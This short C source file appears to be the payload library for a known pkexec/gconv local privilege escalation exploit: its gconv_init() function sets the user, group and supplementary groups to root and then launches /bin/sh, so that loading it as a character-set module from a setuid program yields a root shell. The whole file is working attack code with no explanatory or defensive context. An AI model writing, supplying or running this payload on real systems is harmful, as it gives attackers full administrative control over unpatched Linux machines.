#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <grp.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0, NULL);

    execve("/bin/sh", NULL, NULL);
}
